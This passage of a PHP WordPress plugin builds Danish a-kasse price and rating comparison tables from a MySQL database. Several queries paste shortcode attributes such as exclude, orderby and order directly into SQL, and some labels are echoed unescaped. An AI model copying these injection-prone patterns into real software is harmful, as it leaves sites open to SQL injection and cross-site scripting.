<td  class="tabel-center-middel stack-small"><?php echo $medlemmer; ?></td>
<td  class="tabel-center-middel stack-small" style="font-size:12px;"><?php echo $optagelse; ?></td>
<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span><?php if($recomended>=1) {?><div class="course_ribbon_box" data-toggle="tooltip" data-container="body" title="Den a-kasse der, ifølge vores statistik, er flest der vælger lige nu."><span class="course_ribbon_box_text">Populært valg <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'oversigt_selectable', 'akasse_oversigt_selectable' );
}

 function billigste_akasser($atts) {
 ob_start();
  $a = shortcode_atts( array(
		"exclude" => "",
    ), $atts );
	$exclude = $a['exclude'];
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>
@media (max-width:768px){#billigste_akasser .tabel-center-middel{padding-top:15px!important;position:initial!important;padding-left:0!important;padding-right:0!important}#billigste_akasser .btn-success,#billigste_akasser .header-oversigt{padding-bottom:8px!important;padding-top:8px!important}#billigste_akasser .tr-oversigt{height:160px;position:relative!important;border-bottom:3px solid #ddd!important}#billigste_akasser .btn-success{position:absolute!important;left:0!important;margin-top:85px!important}#billigste_akasser .course_ribbon_box{position:absolute;margin-right:0;left:0px;width:100px;height:50px;}#billigste_akasser .course_ribbon_box .course_ribbon_box_text{position:absolute;left:0px;padding:7px;font:700 9px/1 Lato,sans-serif;margin-top:13px;width:100px}#billigste_akasser .stack-small{display:block!important;border:none!important;padding-bottom:0!important}#billigste_akasser .stack-high{padding-bottom:70px!important;padding-top:15px!important}#billigste_akasser,#billigste_akasser .recomended_box{position:relative}#billigste_akasser .tabel-center-middel-oversigt{position:inherit!important}#billigste_akasser .hide-small{display:none!important}#billigste_akasser .course_ribbon_box_text{width:112px}}
</style>
 <div class="table-responsive">
        <table class="table" style="max-width:850px" id="billigste_akasser">
<thead>
<th class="tabel-center-middel">Billigste A-kasser</th>
<th  class="tabel-center-middel">Pris</th>
<th class="hidden-xs hidden-sm hide-small"></th>
</thead>
<tbody>
<?php
global $db;
$get_list = "SELECT * FROM data WHERE UDBYDER!='$exclude' ORDER BY PRIO ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$pris_mdr = $row_list["PRIS_MDR"];
  $fag_pris_mdr = $row_list["fagforening_pris"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	$id = $row_list["ID"];
  $udbyder = $row_list["UDBYDER"];
	$billig_desc = $row_list["billig_desc"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	$recomended = $row_list["recomended"];
	if ($aktiv != 0) {

?>
<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?> class="tr-oversigt">
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" class="tabel-logos" data-toggle="tooltip" data-container="body" title="billig a-kasse fra <?php echo $udbyder_display; ?>"/><span style="float:right;display:block;width:170px;font-size:12px;margin-top:5px;white-space:pre-wrap!important;text-align:left" class="hide-small"><span><b><?php echo $udbyder_display; ?></b></span> <?php echo $billig_desc; ?></span></td>
<td  class="tabel-center-middel stack-high"><strong><?php echo $pris_mdr; ?></strong><span class="denotion"> kr./md.</span><span class="specs">a-kasse</span></td>
<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span><?php if($recomended>=1) {?><div class="course_ribbon_box" data-toggle="tooltip" data-container="body" title="Den a-kasse der, ifølge vores statistik, er flest der vælger lige nu."><span class="course_ribbon_box_text">Populært valg <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
</tr>
<?php
}
}
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'billigste', 'billigste_akasser' );
}


function priser($atts) {
  $a = shortcode_atts( array(
        "eng" => "",
        "exclude" => "",
    ), $atts );
	global $eng;
	$eng = $a['eng'];
  $exclude = $a['exclude'];
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>
@media (max-width:768px) {
	#priser .tabel-center-middel {
       padding-top: 15px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#priser .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#priser .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: 85px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	}
	#priser .course_ribbon_box {
	    width: 0px;
		position:inherit;
	}
    #priser .course_ribbon_box .course_ribbon_box_text {
		position: absolute;
		display: block;
		LEFT: 0px;
		padding: 7px 7px;
		font: 700 9px/1 Lato,sans-serif;
		margin-top: -22px;
		width:100px;
	}
	#priser .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#priser .hide-small {
		display:none;
	}
	#priser .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#priser .stack-high{
    padding-bottom: 80px!important;
    padding-top: 35px!important;

	}
	#priser .recomended_box {
    position: relative;
	}
	#priser .course_ribbon_box {
		display:none;
	}
	#priser .tabel-center-middel-oversigt {
    position: inherit!important;

	}
	#priser {
		position:relative;
	}
}
</style>
 <div class="table-responsive">
        <table class="table" style="max-width:650px;" id="priser">
<thead>
<th class="tabel-center-middel">A-kasse</th>
<th  class="tabel-center-middel"><?php if(!empty($eng)){ ?>Price/month<?php } else { ?>Pris/md.<?php } ?></th>
<th  class="tabel-center-middel">Trustpilot<br/>Score</th>
<th class="tabel-center-middel hide-small"></th>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM data WHERE UDBYDER!='$exclude' ORDER BY prio ASC, PRIS_MDR ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$pris_mdr = $row_list["PRIS_MDR"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	$id = $row_list["ID"];
    $udbyder = $row_list["UDBYDER"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	$recomended = $row_list["recomended"];
	if ($aktiv != 0) {

?>

<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?> class="tr-oversigt">
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" class="tabel-logos" data-toggle="tooltip" data-container="body" title="a-kasse fra <?php echo $udbyder_display; ?>"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span></td>
<td  class="tabel-center-middel stack-high"><?php echo $pris_mdr; ?>,-</td>
<td  class="tabel-center-middel stack-high" style=" <?php if ($tp >= 4.5 ) { echo "color:#060;" ;} else if   ($tp >= 4.0 ) { echo "color:#ec971f" ; } else { echo "color:#c9302c" ;}  ?>"><b><?php echo $tp; ?> &#9733;</b></td>
<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> <?php if(!empty($eng)){ ?>READ MORE<?php } else { ?>LÆS MERE<?php } ?></span><?php if($recomended>=1) {?><div class="course_ribbon_box" data-toggle="tooltip" data-container="body" title="<?php if(!empty($eng)){ ?>The a-kasse which most people are choosing right now according to our statistics.<?php } else { ?>Den a-kasse der, ifølge vores statistik, er flest der vælger lige nu.<?php } ?>"><span class="course_ribbon_box_text"><?php if(!empty($eng)){ ?>Popular choice<?php } else { ?>Populært valg<?php } ?> <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" ><?php if(!empty($eng)){ ?>Last data update:<?php } else { ?>Data senest opdateret:<?php } ?> <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'priser', 'priser' );
}

 function priser_simple($db) {
 ob_start();
 ?>
 <ul id="priser_simple">
<?php
global $db;
$get_list = "SELECT * FROM data WHERE PRIS_MDR>0 ORDER BY PRIS_MDR ASC LIMIT 12";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {
    $aktiv = $row_list["ACTIVE"];
	$pris_mdr = $row_list["PRIS_MDR"];
    $udbyder = $row_list["UDBYDER"];
	$optagelse = $row_list["OPTAGELSE"]; // bruges til at ekskludere f.eks. joef, da de bruger akademikernes a-kasse pris
	$udbyder_display = $row_list["udbyder_display"];
	if(!empty($pris_mdr) && !empty($optagelse)){
?>
<li><strong><?php echo $udbyder_display;?></strong>
<?php
if(strpos($udbyder_display, "A-kasse") == false) {
echo " a-kasse";
}
?> pris: <?php echo $pris_mdr; ?> kr. per måned</li>
<?php
	}
}
?>
</ul>
  <script>
$(document).ready(function() {
	$("#view_full_list").click(function() {
		getdata("", "" ,"priser_simple");
		$( "#view_full_list" ).hide();
	});
})
</script>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<style>
#view_full_list {
    width: 200px;
    display: block;
    padding: 10px;
    text-align: center;
    margin-bottom: 15px;
    background-color: #ddd;
    cursor: pointer;
    margin-left: 20px;
}
</style>
<span id="view_full_list">Vis fuld liste <span class="glyphicon glyphicon-chevron-down"></span></span>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'priser_simple', 'priser_simple' );
}


function priser_simple_table($atts) {
      $a = shortcode_atts( array(
      "orderby" => "", // 
      "order" => "", // asc or desc
      "exclude_no_fag" => "", // include a-kasser without fagforening or not
      "column1" => "", // String for column1
      "column2" => "", // String for column2
      "column3" => "", // String for column3
      "column4" => "", // String for column4
      "keyword" => "", 
      "include_loensikring" => "", 
     ), $atts );
   global $exclude_no_fag;
   global $orderby;
   global $order;
   global $column1;
   global $column2;
   global $column3;
   global $column4;
   global $keyword;
   global $include_loensikring;
   $orderby = $a['orderby'];
   $order = $a['order'];
   $exclude_no_fag = $a['exclude_no_fag'];
   $column1 = $a['column1'];
   $column2 = $a['column2'];
   $column3 = $a['column3'];
   $column4 = $a['column4'];
   $keyword = $a['keyword'];
   $include_loensikring = $a['include_loensikring'];
  ob_start();
  ?>
  <style>
.totaltd {
  text-align:center;
}
    </style>
  <div class="table-responsive">
  <table class="table" style="max-width:<?php if ($exclude_no_fag=="true") { echo "800";} else {echo "660";} ?>px;">
<thead>
<th><?php echo $keyword; ?> A-kasse</th>
<th><?php echo $column1; ?></th>
<th><?php echo $column2; ?></th>
<?php if ($include_loensikring=="true") { ?><th><?php echo $column4; ?></th><?php } ?>
<?php if ($exclude_no_fag=="true") { ?><th><?php echo $column3; ?></th><?php } ?>
<th>Info</th>
</thead>
<tbody>
 <?php
 global $db;
 if ($exclude_no_fag=="true") { 
  $get_list = "SELECT * FROM data WHERE PRIS_MDR>0 && ACTIVE=1 && fagforening_pris>0 ORDER BY $orderby $order"; // take only with fagforening
 } else {
  $get_list = "SELECT * FROM data WHERE PRIS_MDR>0 && ACTIVE=1 ORDER BY $orderby $order"; 
 }
 $result_list = $db->query($get_list);
 
 while ($row_list = mysqli_fetch_array($result_list)) {
   $pris_mdr = $row_list["PRIS_MDR"];
   $fag_pris_mdr = $row_list["fagforening_pris"];
     $udbyder = $row_list["UDBYDER"];
     $id = $row_list["ID"]; 
   $optagelse = $row_list["OPTAGELSE"]; // bruges til at ekskludere f.eks. joef, da de bruger akademikernes a-kasse pris
   $udbyder_display = $row_list["udbyder_display"];
   if ($include_loensikring=="true") { 
    // loensikring baseret på 31.000 i loen
    $get_loensikring = "SELECT loensikring_udbyder.*, loensikring_priser.* FROM loensikring_udbyder INNER JOIN loensikring_priser ON loensikring_udbyder.name=loensikring_priser.name WHERE salery=31000 AND loensikring_udbyder.name='$udbyder'";
    $result_list_loensikring = $db->query($get_loensikring);
    while ($row_list_loensikring = mysqli_fetch_array($result_list_loensikring)) {
      $loensikring_pris = $row_list_loensikring["price"];
    }
   }
 ?>
 <tr>
 <td><?php echo $udbyder_display;
if(strpos($udbyder_display, "A-kasse") == false) {
echo " a-kasse";
}
?></td>
 <td>Pris: <?php echo $pris_mdr; ?> <span class="denotion">kr./md.</span></td>
 <td>
  <?php if ($fag_pris_mdr>0) {  ?>
  Pris: <?php echo $fag_pris_mdr; ?> <span class="denotion">kr./md.</span>
  <?php 
  } else {
  ?>
  <span style="font-size:12px">Ingen fagforening</span>
  <?php
  }
  ?>
  <?php if ($exclude_no_fag=="true") { ?>
</td>
<?php if ($include_loensikring=="true") { ?>
<td>
Pris: <?php echo $loensikring_pris; ?> <span class="denotion">kr./md.</span>
</td>
<?php } ?>
<td class="totaltd">
  <strong><?php echo $fag_pris_mdr + $pris_mdr + $loensikring_pris; ?></strong> <span class="denotion">kr./md.</span>
</td>
<?php } ?>
<td>
<span style="color:#428bca;text-decoration:none;cursor:pointer" onclick="go_udbyder('<?php echo $id; ?>');">Læs mere </span>
</td>
 </tr>
 <?php
 }
 ?>
 </tbody>
</table>
</div>
 <?php
 global $db;
 $get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
 $result_updated = $db->query($get_updated);
 
 while ($row_updated = mysqli_fetch_array($result_updated)) {
 
      $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
 }
 ?>
 <p>Priserne i tabellen blev senest opdateret: <?php echo $updated; ?></p>
 <?php
 return ob_get_clean();
    }
    global $wp_query;
 if (isset($wp_query->post->ID) ) {
 add_shortcode( 'priser_simple_table', 'priser_simple_table' );
 }


 function loennskring_simple_table($atts) {
  $a = shortcode_atts( array(
  "orderby" => "", // 
  "order" => "", // asc or desc
  "column1" => "", // String for column1
  "column2" => "", // String for column2
  "column3" => "", // String for column3
  "column0" => "", 
 ), $atts );
global $orderby;
global $order;
global $column1;
global $column2;
global $column3;
global $column0;
$orderby = $a['orderby'];
$order = $a['order'];
$column1 = $a['column1'];
$column2 = $a['column2'];
$column3 = $a['column3'];
$column0= $a['column0'];
ob_start();
?>
<style>
.totaltd {
text-align:center;
}
</style>
<div class="table-responsive">
<table class="table" style="max-width:640px;">
<thead>
<th><?php echo $column0; ?></th>
<th><?php echo $column1; ?></th>
<th><?php echo $column2; ?></th>
<th><?php echo $column3; ?></th>
<th>Info</th>
</thead>
<tbody>
<?php
global $db;
$get_list = "SELECT * FROM data WHERE PRIS_MDR>0 && ACTIVE=1 ORDER BY $orderby $order"; 
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {
$pris_mdr = $row_list["PRIS_MDR"];
$udbyder = $row_list["UDBYDER"];
$id = $row_list["ID"]; 
$optagelse = $row_list["OPTAGELSE"]; // bruges til at ekskludere f.eks. joef, da de bruger akademikernes a-kasse pris
$udbyder_display = $row_list["udbyder_display"];

// loensikring baseret på 31.000 i loen
$get_loensikring = "SELECT loensikring_udbyder.*, loensikring_priser.* FROM loensikring_udbyder INNER JOIN loensikring_priser ON loensikring_udbyder.name=loensikring_priser.name WHERE salery=31000 AND loensikring_udbyder.name='$udbyder'";
$result_list_loensikring = $db->query($get_loensikring);
while ($row_list_loensikring = mysqli_fetch_array($result_list_loensikring)) {
  $loensikring_pris_mdr = $row_list_loensikring["price"];
}

?>
<tr>
<td><?php echo $udbyder_display; ?></td>
<td><?php echo $pris_mdr; ?> <span class="denotion">kr./md.</span></td>
<td>
<?php if (!empty($loensikring_pris_mdr)) {  ?>
<?php echo $loensikring_pris_mdr; ?> <span class="denotion">kr./md.</span>
<?php 
} else {
?>
<span style="font-size:12px">Ingen lønsikring</span>
<?php
}
?>
</td>
<td class="totaltd">
<strong><?php echo $loensikring_pris_mdr + $pris_mdr; ?></strong> <span class="denotion">kr./md.</span>
</td>
<td>
<span style="color:#428bca;text-decoration:none;cursor:pointer" onclick="go_udbyder('<?php echo $id; ?>');">Læs mere </span>
</td>
</tr>
<?php
}
?>
<tbody>
</table>
</div>
<p style="font-size:12px">Priserne på lønsikring er basseret på en dækning af en løn på 31.000 DKK før skat med en lønsikrings-udbetalingsperiode på 12 mdr.</p>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

  $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<p>Priserne i tabellen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'loennskring_simple_table', 'loennskring_simple_table' );
}


 function priser_simple_reverse($db) {
 ob_start();
 ?>
 <ol id="priser_simple_reverse">
<?php
global $db;
$get_list = "SELECT * FROM data WHERE PRIS_MDR>0 AND UDBYDER!='DANA' ORDER BY PRIS_MDR DESC LIMIT 8";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {
    $aktiv = $row_list["ACTIVE"];
	$pris_mdr = $row_list["PRIS_MDR"];
    $udbyder = $row_list["UDBYDER"];
	$optagelse = $row_list["OPTAGELSE"]; // bruges til at ekskludere f.eks. joef, da de bruger akademikernes a-kasse pris
	$udbyder_display = $row_list["udbyder_display"];
	if(!empty($pris_mdr) && !empty($optagelse)){
?>
<li><strong><?php echo $udbyder_display;?></strong>
<?php
if(strpos($udbyder_display, "A-kasse") == false) {
echo " a-kasse";
}
?> pris: <?php echo $pris_mdr; ?> kr./md..</li>
<?php
	}
}
?>
</ol>
  <script>
$(document).ready(function() {
	$("#view_full_list").click(function() {
		getdata("", "" ,"priser_simple_reverse");
		$( "#view_full_list" ).hide();
	});
})
</script>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<style>
#view_full_list {
    width: 200px;
    display: block;
    padding: 10px;
    text-align: center;
    margin-bottom: 15px;
    background-color: #ddd;
    cursor: pointer;
    margin-left: 20px;
}
</style>
<span id="view_full_list">Vis fuld liste <span class="glyphicon glyphicon-chevron-down"></span></span>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'priser_simple_reverse', 'priser_simple_reverse' );
}


 function billig_simple($db) {
 ob_start();
 ?>
 <ol id="billig_simple">
<?php
global $db;
$get_list = "SELECT * FROM data WHERE PRIS_MDR>0 ORDER BY PRIS_MDR ASC LIMIT 12";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {
    $aktiv = $row_list["ACTIVE"];
	$pris_mdr = $row_list["PRIS_MDR"];
    $udbyder = $row_list["UDBYDER"];
	$optagelse = $row_list["OPTAGELSE"]; // bruges til at ekskludere f.eks. joef, da de bruger akademikernes a-kasse pris
	$udbyder_display = $row_list["udbyder_display"];
	if(!empty($pris_mdr) && !empty($optagelse)){
?>
<li><strong><?php echo $udbyder_display;?> <?php if (strpos($udbyder_display, 'A-kasse') == false) { echo 'A-kasse'; } ?></strong>: Billig a-kasse for <?php echo $pris_mdr; ?> kr./md.</li>
<?php
	}
}
?>
</ol>
  <script>
$(document).ready(function() {
	$("#view_full_list").click(function() {
		getdata("", "" ,"billig_simple");
		$( "#view_full_list" ).hide();
	});
})
</script>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<style>
#view_full_list {
    width: 200px;
    display: block;
    padding: 10px;
    text-align: center;
    margin-bottom: 15px;
    background-color: #ddd;
    cursor: pointer;
    margin-left: 20px;
}
</style>
<span id="view_full_list">Vis fuld liste <span class="glyphicon glyphicon-chevron-down"></span></span>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'billig_simple', 'billig_simple' );
}

function billig_simple_table($db) {
  ob_start();
  ?>
 <table class="table" style="max-width:620px;">
<thead>
<th>Billig A-kasse</th>
<th>Priser for fuldtidsforsikring</th>
</thead>
<tbody> 
 <?php
 global $db;
 $get_list = "SELECT * FROM data WHERE PRIS_MDR>0 ORDER BY PRIS_MDR ASC";
 $result_list = $db->query($get_list);
 while ($row_list = mysqli_fetch_array($result_list)) {
   $pris_mdr = $row_list["PRIS_MDR"];
   $udbyder_display = $row_list["udbyder_display"];
 ?>
 <tr>
  <td><?php echo $udbyder_display; ?></td>
  <td><?php echo $pris_mdr; ?> kr./md.</td>
</tr>
 <?php
 }
 ?>
</tbody> 
</table>
 <?php
 global $db;
 $get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
 $result_updated = $db->query($get_updated);
 
 while ($row_updated = mysqli_fetch_array($result_updated)) {
 
      $updated =date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
 }
 ?>
 <p>Tabellen er senest opdateret: <?php echo $updated; ?></p>
 <?php
 return ob_get_clean();
    }
    global $wp_query;
 if (isset($wp_query->post->ID) ) {
 add_shortcode( 'billig_simple_table', 'billig_simple_table' );
 }



 function bedste_akasser_simple($db) {
 ob_start();
 ?>
 <ol id="bedste_akasser_simpl">
<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY TRUSTPILOT_SCORE DESC, prio ASC LIMIT 8";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
  $tp_count = $row_list["count"];
	$udbyder_display = $row_list["udbyder_display"];
    $udbyder = $row_list["UDBYDER"];
	$optagelse = $row_list["OPTAGELSE"]; // bruges til at ekskludere f.eks. joef, da de bruger akademikernes a-kasse pris
	$logo = $row_list["logo"];
	if( $tp != "0" && !empty($optagelse)) {
?>
<li>
<strong><?php echo $udbyder_display;?> <?php if (strpos($udbyder_display, 'A-kasse') == false) { echo 'A-kasse'; } ?></strong>: <?php echo $tp; ?>/5 (<?php echo $tp_count; ?> anmeldelser)</li>
<?php
	}
}
?>
</ol>
  <script>
$(document).ready(function() {
	$("#view_full_list").click(function() {
		getdata("", "" ,"bedste_akasser_simpl");
		$( "#view_full_list" ).hide();
	});
})
</script>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<style>
#view_full_list {
    width: 200px;
    display: block;
    padding: 10px;
    text-align: center;
    margin-bottom: 15px;
    background-color: #ddd;
    cursor: pointer;
    margin-left: 20px;
}
</style>
<span id="view_full_list">Vis fuld liste <span class="glyphicon glyphicon-chevron-down"></span></span>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'bedste_simple', 'bedste_akasser_simple' );
}

 function bedste_loensikring_simple($db) {
 ob_start();
 ?>
  <script>
$(document).ready(function() {
	$("#view_full_list").click(function() {
		getdata("", "" ,"bedste_loensikring_simple");
		$( "#view_full_list" ).hide();
	});
})
</script>
 <ol id="bedste_loensikring_simple">
<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY TRUSTPILOT_SCORE DESC, prio ASC LIMIT 8";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	$udbyder_display = $row_list["udbyder_display"];
    $udbyder = $row_list["UDBYDER"];
	$logo = $row_list["logo"];
	if( $tp != "0") {
?>
<li>
<strong><?php echo $udbyder_display;?></strong> lønsikring
: <?php echo $tp; ?>/5</li>
<?php
	}
}
?>
</ol>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<style>
#view_full_list {
    width: 200px;
    display: block;
    padding: 10px;
    text-align: center;
    margin-bottom: 15px;
    background-color: #ddd;
    cursor: pointer;
    margin-left: 20px;
}
</style>
<span id="view_full_list">Vis fuld liste <span class="glyphicon glyphicon-chevron-down"></span></span>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'bedste_loensikring_simple', 'bedste_loensikring_simple' );
}

 function bedste_fagforening_simple($db) {
 ob_start();
 ?>
 <ol id="bedste_fagforening_simpl">
<?php
global $db;
$get_list = "SELECT * FROM data WHERE fagforening_pris>0 ORDER BY TRUSTPILOT_SCORE DESC, prio ASC limit 8";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	$udbyder_display = $row_list["udbyder_display"];
    $udbyder = $row_list["UDBYDER"];
	if( $tp != "0") {
?>
<li>
<strong><?php echo $udbyder_display;?></strong>
<?php echo " fagforening"; ?>: <?php echo $tp; ?>/5</li>
<?php
	}
}
?>
</ol>
  <script>
$(document).ready(function() {
	$("#view_full_list").click(function() {
		getdata("", "" ,"bedste_fagforening_simpl");
		$( "#view_full_list" ).hide();
	});
})
</script>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<style>
#view_full_list {
    width: 200px;
    display: block;
    padding: 10px;
    text-align: center;
    margin-bottom: 15px;
    background-color: #ddd;
    cursor: pointer;
    margin-left: 20px;
}
</style>
<span id="view_full_list">Vis fuld liste <span class="glyphicon glyphicon-chevron-down"></span></span>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'bedste_fagforening_simple', 'bedste_fagforening_simple' );
}

function bedste_akasser($db) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
   <div class="swipe">
   <p><img src="/images/swipe.png" alt="swipe a-kasse"/>Swipe for at se fuld tabel</p>
   </div>
  <div class="table-responsive">
        <table class="table" style="max-width:620px;">
<thead>
<th class="tabel-center-middel">A-kasse</th>
<th  class="tabel-center-middel">Score</th>
<th  class="tabel-center-middel"></th>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY TRUSTPILOT_SCORE DESC, prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
